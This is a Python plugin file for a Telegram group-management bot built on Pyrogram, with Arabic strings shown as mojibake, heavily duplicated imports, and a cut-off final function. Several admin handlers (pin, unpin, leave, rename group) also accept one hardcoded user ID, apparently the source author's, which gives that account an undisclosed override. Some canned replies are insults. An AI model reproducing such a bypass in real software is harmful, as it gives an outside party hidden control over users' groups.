import asyncio
import re
import time
import requests
import aiohttp
import time
import asyncio
import calendar
import random
import re
import textwrap
import aiofiles
import aiohttp
import time
import requests
import datetime
import sys
import config

from pyrogram import Client, filters
from pyrogram import filters
from datetime import datetime
from pyrogram import enums




from VeRoNMusic import app
from VeRoNMusic.utils.database import delete_served_chat, get_assistant, is_on_off
from pyrogram import Client, filters
from VeRoNMusic.core.userbot import Userbot
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
from config import OWNER_ID 
from VeRoNMusic import app
from VeRoNMusic.misc import SUDOERS
from config import OWNER_ID
from config import BANNED_USERS
from config import BANNED_USERS, OWNER_ID
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from pyrogram.types import CallbackQuery, InputMediaPhoto, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType, ChatMemberStatus
from pyrogram.enums import ChatMemberStatus, ParseMode
from VeRoNMusic import app
from pyrogram.enums import ChatMembersFilter
from pyrogram.enums import ChatMemberStatus
from pyrogram.types import ChatPermissions, ChatPrivileges
from config import *
from pyrogram.enums import ChatMembersFilter
from telegraph import upload_file
from asyncio import gather
from pyrogram.enums import ChatMembersFilter
from pyrogram.enums import ChatMemberStatus
from pyrogram.types import ChatPermissions, ChatPrivileges
from config import *
from pyrogram.enums import ChatMembersFilter
import asyncio
import asyncio

import os
import time
import requests
from config import START_IMG_URL
from pyrogram import filters
import random
from pyrogram import Client
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from VeRoNMusic import (Apple, Resso, SoundCloud, Spotify, Telegram, YouTube, app)
from VeRoNMusic import app
from random import  choice, randint



import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from VeRoNMusic import app
import random
    

from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
import random

from pyrogram.enums import ParseMode

from VeRoNMusic import app
from VeRoNMusic.utils.database import is_on_off




from pyrogram import filters
from pyrogram.types import *
from VeRoNMusic import app
from gpytranslate import Translator



from pyrogram import filters
from pyrogram import Client
from VeRoNMusic.core.call import KIM
from pyrogram.enums import ChatMemberStatus
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from VeRoNMusic import (Apple, Resso, SoundCloud, Spotify, Telegram, YouTube, app)
from VeRoNMusic import app
from telegraph import upload_file
from asyncio import gather

import random
from VeRoNMusic.misc import SUDOERS
from pyrogram.types import (Message,InlineKeyboardButton,InlineKeyboardMarkup,CallbackQuery,ChatPrivileges)
from pyrogram import filters, Client
from VeRoNMusic import app
from config import *

import asyncio
import os
import random
import re
import textwrap
import aiofiles
import aiohttp
from PIL import Image, ImageDraw, ImageEnhance, ImageFilter, ImageFont, ImageOps
from youtubesearchpython.__future__ import VideosSearch
import numpy as np

from config import YOUTUBE_IMG_URL
import platform
from sys import version as pyver
import aiohttp
import psutil
import asyncio
from pyrogram import __version__ as pyrover
from pyrogram import filters
from pyrogram import Client
from pyrogram.errors import MessageIdInvalid
from pyrogram.types import InputMediaPhoto, Message
from pytgcalls.__version__ import __version__ as pytgver
from config import OWNER_ID
import config
from VeRoNMusic import app
from VeRoNMusic.core.userbot import assistants
from VeRoNMusic.misc import SUDOERS, pymongodb
from VeRoNMusic.plugins import ALL_MODULES

from VeRoNMusic.utils.decorators.language import language, languageCB
from VeRoNMusic.utils.inline.stats import back_stats_buttons, stats_buttons
from config import BANNED_USERS
##
from pyrogram.enums import ChatType, ChatMemberStatus
from pyrogram.enums import ChatMemberStatus, ParseMode
from pyrogram.enums import ChatMembersFilter
from pyrogram.enums import ChatMemberStatus
from VeRoNMusic.misc import SUDOERS
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, ReplyKeyboardMarkup
from pyrogram.types import (InlineKeyboardButton,CallbackQuery,InlineKeyboardMarkup, Message)

from pyrogram.types import (InlineKeyboardButton, ChatPermissions, InlineKeyboardMarkup, Message, User)




import asyncio
import os
import time
import requests
import datetime
import random
import os
import time
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram import enums, filters
from VeRoNMusic import app

from pytz import timezone
from pyrogram import enums
import aiohttp
import datetime
from pytz import timezone
from pyrogram import filters
from pyrogram import Client
from typing import Union
from random import choice
from config import OWNER_ID
from config import BANNED_USERS
from config import BANNED_USERS, OWNER_ID
from VeRoNMusic.core.call import KIM
from pyrogram.enums import ChatMemberStatus
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from pyrogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from VeRoNMusic import (Apple, Resso, SoundCloud, Spotify, Telegram, YouTube, app)
from VeRoNMusic import app
from telegraph import upload_file
from asyncio import gather
from pyrogram.errors import FloodWait
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup






import asyncio
from PIL import Image, ImageDraw, ImageFont
from pyrogram import filters, Client, enums
from pyrogram.types import *
from typing import Union, Optional
from VeRoNMusic import app as Hiroko 

# Function to get font and resize text


import random
from pyrogram import filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
from PIL import Image
import os


import asyncio
import re
import time
import requests
import aiohttp
import time
import asyncio
from pyrogram import Client, filters
from pyrogram import filters
from datetime import datetime
from pyrogram import enums
from VeRoNMusic.misc import SUDOERS
from config import OWNER_ID
from config import BANNED_USERS
from config import BANNED_USERS, OWNER_ID
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from pyrogram.types import CallbackQuery, InputMediaPhoto, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType, ChatMemberStatus
from pyrogram.enums import ChatMemberStatus, ParseMode
from VeRoNMusic import app
from pyrogram.enums import ChatMembersFilter
from pyrogram.enums import ChatMemberStatus
from pyrogram.types import ChatPermissions, ChatPrivileges
from config import *
from pyrogram.enums import ChatMembersFilter
from telegraph import upload_file
from asyncio import gather
from pyrogram.enums import ChatMembersFilter
from pyrogram.enums import ChatMemberStatus
from pyrogram.types import ChatPermissions, ChatPrivileges
from config import *
from pyrogram.enums import ChatMembersFilter
import asyncio

from pyrogram.enums import ParseMode

from VeRoNMusic import app
from VeRoNMusic.utils.database import is_on_off




from pyrogram import filters
from pyrogram import Client
from VeRoNMusic.core.call import KIM
from pyrogram.enums import ChatMemberStatus
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from VeRoNMusic import (Apple, Resso, SoundCloud, Spotify, Telegram, YouTube, app)
from VeRoNMusic import app
from telegraph import upload_file
from asyncio import gather

import random
from VeRoNMusic.misc import SUDOERS
from pyrogram.types import (Message,InlineKeyboardButton,InlineKeyboardMarkup,CallbackQuery,ChatPrivileges)
from pyrogram import filters, Client
from VeRoNMusic import app
from config import *

import asyncio
from typing import Dict, List, Tuple

from pyrogram import Client, filters




def is_owner(_, __, message):
    return message.from_user.id == OWNER_ID



from PIL import Image, ImageDraw, ImageFont
import calendar
import io

        

@app.on_message(filters.command(["Ù†ØªÙŠØ¬Ù‡","Ø§Ù„Ù†ØªÙŠØ¬Ù‡"], "") & filters.group, group=4442)
async def cale_ndar(client: Client, message: Message):
    ask = await app.ask(message.chat.id, "Ø§Ø±Ø³Ù„ Ø§Ù„Ø´Ù‡Ø± Ø¨Ø§Ù„Ø§Ø±Ù‚Ø§Ù…", timeout=300)
    mm = ask.text 
    yy = 2024 

    if mm.isdigit() and 1 <= int(mm) <= 12:

        img = Image.new('RGB', (600, 600), color='black')
        d = ImageDraw.Draw(img)
        fnt = ImageFont.truetype('VeRoNMusic/assets/font2.ttf', 30)
        cal = calendar.monthcalendar(yy, int(mm))
        for week_num, week in enumerate(cal):
            for day_num, day in enumerate(week):
                d.text((100 + day_num * 100, 50 + week_num * 50), str(day), font=fnt, fill='white')


        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)


        await message.reply_photo(photo=img_byte_arr, caption=calendar.month(yy, int(mm)))
    else:
        await message.reply("Ø´Ù‡Ø± ØºÙŠØ± ØµØ§Ù„Ø­. Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø´Ù‡Ø± ØµØ§Ù„Ø­ Ø¨ÙŠÙ† 1 Ùˆ 12.")

    

    
    


MUSIC_BOT_NAME = {}

botname = {}


name = ""

@app.on_message(filters.regex("ØªØ¹ÙŠÙ† Ø§Ø³Ù… Ø§Ù„Ø¨ÙˆØª") & filters.private & filters.user(OWNER_ID), group=609760)
async def set_bot_name(client, message):
    global name
    ask = await app.ask(message.chat.id, "Ø§Ø±Ø³Ù„ Ø§Ù„Ø§Ø³Ù… Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø¬Ø¯ÙŠØ¯", timeout=300)
    name = ask.text
    await message.reply_text("ØªÙ… ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ø§Ø³Ù… Ù„Ù„Ø¨ÙˆØª Ø¨Ù†Ø¬Ø§Ø­")

keemo_responses = [
    "Ø§Ø³Ù…ÙŠ <b>{name}<b> ÙŠØ§Ø®ÙŠ",
    "Ù‚ØªÙ„Ùƒ Ø§Ø³Ù…ÙŠ <b>{name}</b>",
    "Ù†Ø¹Ù… Ø­Ø¨ÙŠ Ø§Ø³Ù…ÙŠ <b>{name}</b>",
    "Ù‚ÙˆÙ„ ÙŠÙ‚Ù„Ø¨ <b>{name}</b>",
    "ÙˆØ±Ø­Ù…Ø© Ø£Ø¨ÙˆÙŠØ§ Ø§Ø³Ù…ÙŠ <b>{name}</b>",
    "ÙŠØ¹Ù… ÙÙƒÙƒ Ù…Ù†ÙŠ",
    "Ø±ÙƒØ² Ø§Ø³Ù…ÙŠ <b>{name}</b> ÙŠÙ…Ø³Ù„Ù…",
    "Ù†Ø¯ÙŠÙ†ÙŠ <b>{name}</b>",
    "Ù…Ø´ Ù‡Ø±Ø¯ Ø¹Ù„ÙŠÙƒ Ø¹Ù„Ø´Ø§Ù† Ø§Ø³Ù…ÙŠ <b>{name}</b>",
    "Ø§Ø³Ù…ÙŠ <b>{name}<b> Ø§Ù„Ù…Ø·Ø±Ø´Ù…",
    "Ø§Ù†Ø§ <b>{name}<b> Ø§Ø¨Ùˆ Ø¬Ù„Ø§Ø¨ÙŠÙ‡ Ø§Ù„ÙŠ Ù…Ø¨Ø´ÙˆÙØ´",
    "ÙŠÙ†Ø­Ù… Ø§Ø³Ù…ÙŠ <b>{name}</b>",
    "Ø§Ø±Ø­Ù… Ø¯ÙŠÙ† Ø§Ù… <b>{name}</b>",
    "Ù‡Ùˆ <b>{name}<b> Ø§Ø³Ù… Ø´Ø±ÙƒÙ‡",
    "Ù‡Ùˆ Ø§Ø³Ù… <b>{name}<b> Ø§Ù…Ùƒ",
    " ÙˆÙ„Ùƒ ÙŠÙØ¶Ø­ Ø¹Ø±Ø¶Ùƒ Ø´Ù†Ùˆ Ù‡Ø§ÙŠ",
    "ÙˆÙ„Ùƒ ÙŠÙØ¶Ø­ Ø¹Ø±Ø¶Ùƒ ÙŠØ²Ù„Ù…Ù‡",
    " Ø§Ù†Ø§ <b>{name}<b> Ø¹Ø¬Ø¨Ùƒ",
    "Ø§Ù†Ø§ <b>{name}<b> Ø§Ù„Ù…Ø·Ø±Ø´Ù…",
    "Ù‚Ø±ÙØª Ø¯ÙŠÙ† Ø§Ù… <b>{name}</b>",
    " Ù†Ø¯ÙŠÙ†ÙŠ <b>{name}<b> ÙŠØ­Ø¨",
    " Ø§Ø³Ù…ÙŠ <b>{name}<b> ÙŠØ¹Ø±Øµ",
    "Ø§Ø³Ù…ÙŠ <b>{name}<b> ÙŠØµØ­Ø¨ÙŠ",
    "ÙŠØ³Ø·Ø§ Ù‚ÙˆÙ„ØªÙ„Ùƒ Ø§Ø³Ù…ÙŠ <b>{name}<b> Ø§Ù„Ø§Ù‡"
]

@app.on_message(filters.command(["Ø¨ÙˆØª", "Ø§Ù„Ø¨ÙˆØª","Ø¨ÙˆØªÙŠ","Ø¨ÙˆØªÙƒ"], ""), group=71135)
async def keemo_bot(client, message):
    global name
    bot_username = (await app.get_me()).username
    bar = random.choice(keemo_responses).format(name=name)
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("ê™³.Ø®Ø¯Ù†ÙŠ Ù„Ø¬Ø±ÙˆØ¨Ùƒ.ê™³", url=f"https://t.me/{bot_username}?startgroup=True")]
    ])

    await message.reply_text(
        text=f"{bar}",
        disable_web_page_preview=True,
        reply_markup=keyboard
    )


@app.on_message(filters.text & filters.group, group=55554)
async def gsgshshs(client, message):
    global name
    if message.text == name:
        bot_username = (await app.get_me()).username
        bar = random.choice(keemo_responses).format(name=name)
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("ê™³.Ø®Ø¯Ù†ÙŠ Ù„Ø¬Ø±ÙˆØ¨Ùƒ.ê™³", url=f"https://t.me/{bot_username}?startgroup=True")]
        ])

        await message.reply_text(
            text=f"{bar}",
            disable_web_page_preview=True,
            reply_markup=keyboard
        )

##
@app.on_message(filters.command(["ØµÙ„Ø§Ø­ÙŠØ§ØªÙŠ"], "") & filters.group, group=6662223)
async def privilegess(client, message):
    chat_id = message.chat.id
    user_id = message.from_user.id if message.from_user else "1121532100"
    kimmy = await client.get_chat_member(chat_id, user_id)
    status = kimmy.status if kimmy else None
    if status == ChatMemberStatus.OWNER:
        await message.reply_text("Ø£Ù†Øª Ù…Ø§Ù„Ùƒ Ø§Ù„Ø¬Ø±ÙˆØ¨")
    elif status == ChatMemberStatus.MEMBER:
        await message.reply_text("Ø£Ù†Øª Ø¹Ø¶Ùˆ Ø­Ù‚ÙŠØ±")
    else:
        privileges = kimmy.privileges if kimmy else None 
        can_promote_members = "âˆš" if (privileges and privileges.can_promote_members) else "âœ˜"
        can_manage_video_chats = "âˆš" if (privileges and privileges.can_manage_video_chats) else "âœ˜"
        can_pin_messages = "âˆš" if (privileges and privileges.can_pin_messages) else "âœ˜"
        can_invite_users = "âˆš" if (privileges and privileges.can_invite_users) else "âœ˜"
        can_restrict_members = "âˆš" if (privileges and privileges.can_restrict_members) else "âœ˜"
        can_delete_messages = "âˆš" if (privileges and privileges.can_delete_messages) else "âœ˜"
        can_change_info = "âˆš" if (privileges and privileges.can_change_info) else "âœ˜"
        sohailaa = f"<b>ØµÙ„Ø§Ø­ÙŠØ§ØªÙƒ ÙÙŠ Ø§Ù„Ø¬Ø±ÙˆØ¨:</b>\n\n"
        sohailaa += f"<b>Ø§Ø¶Ø§ÙØ© Ù…Ø´Ø±ÙÙŠÙ†:</b> {can_promote_members}\n"
        sohailaa += f"<b>Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø¨Ø«ÙˆØ« Ø§Ù„Ù…Ø¨Ø§Ø´Ø±Ø©:</b> {can_manage_video_chats}\n"
        sohailaa += f"<b>ØªØ«Ø¨ÙŠØª Ø§Ù„Ø±Ø³Ø§Ø¦Ù„:</b> {can_pin_messages}\n"
        sohailaa += f"<b>Ø¯Ø¹ÙˆØ© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†:</b> {can_invite_users}\n"
        sohailaa += f"<b>Ø­Ø¸Ø± Ø§Ù„Ù…Ø³Ø®Ø¯Ù…ÙŠÙ†:</b> {can_restrict_members}\n"
        sohailaa += f"<b>Ø­Ø°Ù Ø§Ù„Ø±Ø³Ø§Ø¦Ù„:</b> {can_delete_messages}\n"
        sohailaa += f"<b>ØªØºÙŠÙŠØ± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹Ø©:</b> {can_change_info}\n"
        await message.reply_text(sohailaa)


# ØµÙ„Ø§Ø­ÙŠØ§ØªÙ‡  â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
# ØµÙ„Ø§Ø­ÙŠØ§ØªÙ‡  â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“


@app.on_message(filters.command(["ØµÙ„Ø§Ø­ÙŠØ§ØªÙ‡"], "") & filters.group, group=2220190)
async def privilegess(client, message):
    chat_id = message.chat.id
    user_id = message.reply_to_message.from_user.id
    kimmy = await client.get_chat_member(chat_id, user_id)
    status = kimmy.status if kimmy else None
    if status == ChatMemberStatus.OWNER:
        await message.reply_text(" Ø¯Ø§ Ù…Ø§Ù„Ùƒ Ø§Ù„Ø¬Ø±ÙˆØ¨")
    elif status == ChatMemberStatus.MEMBER:
        await message.reply_text("Ø¯Ø§ Ø¹Ø¶Ùˆ Ø­Ù‚ÙŠØ±")
    else:
        privileges = kimmy.privileges if kimmy else None 
        can_promote_members = "âˆš" if (privileges and privileges.can_promote_members) else "âœ˜"
        can_manage_video_chats = "âˆš" if (privileges and privileges.can_manage_video_chats) else "âœ˜"
        can_pin_messages = "âˆš" if (privileges and privileges.can_pin_messages) else "âœ˜"
        can_invite_users = "âˆš" if (privileges and privileges.can_invite_users) else "âœ˜"
        can_restrict_members = "âˆš" if (privileges and privileges.can_restrict_members) else "âœ˜"
        can_delete_messages = "âˆš" if (privileges and privileges.can_delete_messages) else "âœ˜"
        can_change_info = "âˆš" if (privileges and privileges.can_change_info) else "âœ˜"
        kamall = f"<b>ØµÙ„Ø§Ø­ÙŠØ§ØªÙ‡ ÙÙŠ Ø§Ù„Ø¬Ø±ÙˆØ¨:\n\n</b>"
        kamall += f"<b>Ø§Ø¶Ø§ÙØ© Ù…Ø´Ø±ÙÙŠÙ†: {can_promote_members}</b>\n"
        kamall += f"<b>Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø¨Ø«ÙˆØ« Ø§Ù„Ù…Ø¨Ø§Ø´Ø±Ø©: {can_manage_video_chats}</b>\n"
        kamall += f"<b>ØªØ«Ø¨ÙŠØª Ø§Ù„Ø±Ø³Ø§Ø¦Ù„: {can_pin_messages}</b>\n"
        kamall += f"<b>Ø¯Ø¹ÙˆØ© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†: {can_invite_users}</b>\n"
        kamall += f"<b>Ø­Ø¸Ø± Ø§Ù„Ù…Ø³Ø®Ø¯Ù…ÙŠÙ†: {can_restrict_members}</b>\n"
        kamall += f"<b>Ø­Ø°Ù Ø§Ù„Ø±Ø³Ø§Ø¦Ù„: {can_delete_messages}</b>\n"
        kamall += f"<b>ØªØºÙŠÙŠØ± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹Ø©: {can_change_info}</b>\n"
        await message.reply_text(kamall)



# Ù„Ù‚Ø¨Ø¨ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
# Ù„Ù‚Ø¨Ø¨ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“

@app.on_message(filters.command(["Ù„Ù‚Ø¨ÙŠ"], "") & filters.group, group=7272727866)
async def title(client, message):
    user_id = message.from_user.id if message.from_user else "1121532100"
    chat_id = message.chat.id
    user = await client.get_chat_member(chat_id, user_id)    
    if user.status in [ChatMemberStatus.OWNER]:
        await message.reply_text(f"Ù…Ø§Ù„Ùƒ Ø§Ù„Ø¬Ø±ÙˆØ¨ âœ¨")
    elif user.status == ChatMemberStatus.MEMBER:
     await message.reply_text("Ø¹Ø¶Ùˆ âœ¨")
    elif user.status == ChatMemberStatus.ADMINISTRATOR:
        title = user.custom_title if user.custom_title else "Ù…Ø´Ø±Ù"
        await message.reply_text(f"Ù„Ù‚Ø¨Ùƒ Ù‡Ùˆ [{title}] ÙŠ Ø±ÙˆØ­ÙŠ âœ¨")


# Ù„Ù‚Ø¨Ù‡ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
# Ù„Ù‚Ø¨Ù‡ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“


@app.on_message(filters.command(["Ù„Ù‚Ø¨Ù‡"], "") & filters.group, group=72727866)
async def title(client, message):
    user_id = message.reply_to_message.from_user.id
    chat_id = message.chat.id
    user = await client.get_chat_member(chat_id, user_id)    
    if user.status in [ChatMemberStatus.OWNER]:
        await message.reply_text("Ù…Ø§Ù„Ùƒ Ø§Ù„Ø¬Ø±ÙˆØ¨ âœ¨")
    elif user.status == ChatMemberStatus.MEMBER:
     await message.reply_text("Ø¹Ø¶Ùˆ âœ¨")
    elif user.status == ChatMemberStatus.ADMINISTRATOR:
        title = user.custom_title if user.custom_title else "Ù…Ø´Ø±Ù"
        await message.reply_text(f"Ù„Ù‚Ø¨Ù‡ Ù‡Ùˆ [{title}] ÙŠ Ø±ÙˆØ­ÙŠ âœ¨")

        
# Ù…ÙŠÙ† Ø±ÙØ¹Ù†ÙŠ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
# Ù…ÙŠÙ† Ø±ÙØ¹Ù†ÙŠ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“


@app.on_message(filters.command(["Ù…ÙŠÙ† Ø±ÙØ¹Ù†ÙŠ"], "") & filters.group, group=72)
async def get_promoted_by(client, message):
    chat_id = message.chat.id
    user_id = message.from_user.id if message.from_user else "1121532100"
    member = await client.get_chat_member(chat_id, user_id)  
    if member.add_by:
        add_by = member.add_by.first_name
        await message.reply_text(f"ØªÙ… Ø±ÙØ¹Ùƒ Ù…Ù† Ù‚Ø¨Ù„ {add_by} âœ¨")
    else:
        await message.reply_text("Ù„Ù„Ø§Ø³Ù Ù„Ø³Ù‡ Ù…Ø­Ø¯Ø´ Ø±ÙØ¹Ùƒ ÙŠ Ø±ÙˆØ­ÙŠ âœ¨")
        

#ØªÙÙ„ÙŠØ´ Ø®Ø§Øµ Ø¨Ù…ÙƒÙˆØ± Ø§Ù„Ø³ÙˆØ±Ø³ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
#ØªÙÙ„ÙŠØ´ Ø®Ø§Øµ Ø¨Ù…ÙƒÙˆØ± Ø§Ù„Ø³ÙˆØ±Ø³ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“



@app.on_message(filters.command(["ØºØ§Ø¯Ø±"], "") & filters.group, group=27281)
async def leave(bot, message: Message):
    msg = await message.reply("ğŸ¤¬")
    await sleep(2)
    await msg.delete()
    if message.from_user.id == OWNER_ID or message.from_user.id == 8040979911:
        await message.reply_text('Ø­Ø§Ø¶Ø± Ù‡Ø·Ø¹ Ù…Ù† Ø¬Ø±ÙˆØ¨')
        await bot.leave_chat(message.chat.id)
    else:
        await message.reply("Ù„Ø§ Ù…Ø´ Ù‡Ø·Ù„Ø¹ Ù…Ù† Ù‡Ù†Ø§ Ù…Ø´ ğŸ¥ºğŸ˜’")

#Ù…Ø³Ø­ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
#Ù…Ø³Ø­ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“


@app.on_message(filters.command(["Ø­Ø°Ù"], ""), group=90027373630063)
async def get_restricted_users(client: Client, message: Message):
    if message.reply_to_message:
        reply_message = message.reply_to_message
        await message.delete()
        await reply_message.delete()
    else:
        await message.reply("Ù„Ø§Ø²Ù… ØªØ¹Ù…Ù„ Ø±ÙŠØ¨ Ø¹ Ø§Ù„Ø±Ø³Ø§Ù„Ù‡ ÙŠ Ø±ÙˆØ­ÙŠ âœ¨")


#ØªØ«Ø¨ÙŠØª Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø®Ø§ØµÙ‡ Ù„Ù„Ù…Ø§Ù„Ùƒ Ø§Ù„Ø¬Ø±ÙˆØ¨ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
#ØªØ«Ø¨ÙŠØª Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø®Ø§ØµÙ‡ Ù„Ù„Ù…Ø§Ù„Ùƒ Ø§Ù„Ø¬Ø±ÙˆØ¨ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“


@app.on_message(filters.command("ØªØ«Ø¨ÙŠØª", "") & filters.group, group=82762727)
async def ppin_message(client, message):
   get = await client.get_chat_member(message.chat.id, message.from_user.id)
   if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR] or message.from_user.id == 8040979911:
    if message.reply_to_message:
        await client.pin_chat_message(message.chat.id, message.reply_to_message.id)
        await message.reply_text(f"ã€Œ {message.from_user.mention} ã€\nÙ„Ù‚Ø¯ Ø«Ø¨Øª Ø§Ù„Ø±Ø³Ø§Ù„Ù‡\nà¼„ ")
    else:
        await message.reply("Ù„Ø§Ø²Ù… ØªØ¹Ù…Ù„ Ø±ÙŠØ¨ Ø¹ Ø§Ù„Ø±Ø³Ø§Ù„Ù‡ ÙŠ Ø±ÙˆØ­ÙŠ âœ¨")
   else:
        await message.reply("Ù„Ø§Ø²Ù… ØªÙƒÙˆÙ† Ø¹ Ø§Ù„Ø§Ù‚Ù„ Ø§Ø¯Ù…Ù† Ø§Ùˆ Ø§Ø¹Ù„ÙŠ âœ¨")



@app.on_message(filters.command(["Ø§Ù„ØºØ§Ø¡ Ø§Ù„ØªØ«Ø¨ÙŠØª"], "") & filters.group, group=727252637)
async def unpin_message(client, message):
   get = await client.get_chat_member(message.chat.id, message.from_user.id)
   if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR] or message.from_user.id == 8040979911:
    if message.reply_to_message:
        await client.unpin_chat_message(message.chat.id, message.reply_to_message.id)
        await message.reply_text(f"ã€Œ {message.from_user.mention} ã€ Ø§Ù„ØºÙŠØª ØªØ«Ø¨ÙŠØª Ø§Ù„Ø±Ø³Ø§Ù„Ù‡\nà¼„ ")
    else:
        await message.reply("Ù‡Ø°Ø§ Ø§Ù„Ø§Ù…Ø± Ù„ÙŠØ³ Ù„Ùƒ âœ¨")
   else:
        await message.reply("Ù„Ø§Ø²Ù… ØªÙƒÙˆÙ† Ø¹ Ø§Ù„Ø§Ù‚Ù„ Ø§Ø¯Ù…Ù† Ø§Ùˆ Ø§Ø¹Ù„ÙŠ âœ¨")    



@app.on_message(filters.command("Ø§Ù„ØºØ§Ø¡ ØªØ«Ø¨ÙŠØª Ø§Ù„ÙƒÙ„", "") & filters.group, group=87878791004300)
async def unbanall(client, message):
   get = await client.get_chat_member(message.chat.id, message.from_user.id)
   if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR] or message.from_user.id == 8040979911:
       chat_id = message.chat.id
       await app.unpin_all_chat_messages(chat_id)
       await message.reply_text(f"ØªÙ… Ø§Ù„ØºØ§Ø¡ ØªØ«ÙŠØ¨Øª Ø§Ù„ÙƒÙ„ã€Œ {message.from_user.mention} ã€Ø¨Ù†Ø¬Ø§Ø­ âœ¨")
   else:
        await message.reply("Ù„Ø§Ø²Ù… ØªÙƒÙˆÙ† Ø¹ Ø§Ù„Ø§Ù‚Ù„ Ø§Ø¯Ù…Ù† Ø§Ùˆ Ø§Ø¹Ù„ÙŠ âœ¨")


#ØªØºÙŠØ± ÙˆØµÙ Ùˆ Ø§Ø³Ù… Ø§Ù„Ø¬Ø±ÙˆØ¨ Ø®Ø§Øµ Ù„Ù…Ø§Ù„Ùƒ Ø§Ù„Ø¬Ø±ÙˆØ¨  â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
#ØªØºÙŠØ± ÙˆØµÙ Ùˆ Ø§Ø³Ù… Ø§Ù„Ø¬Ø±ÙˆØ¨ Ø®Ø§Øµ Ù„Ù…Ø§Ù„Ùƒ Ø§Ù„Ø¬Ø±ÙˆØ¨  â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“

                                   
@app.on_message(filters.command("ØªØºÙŠØ± Ø§Ø³Ù… Ø§Ù„Ø¬Ø±ÙˆØ¨", "") & filters.group, group=90876543)
async def tasfaghhhya(client, message):
   get = await client.get_chat_member(message.chat.id, message.from_user.id)
   if get.status in [ChatMemberStatus.OWNER] or message.from_user.id == 8040979911:
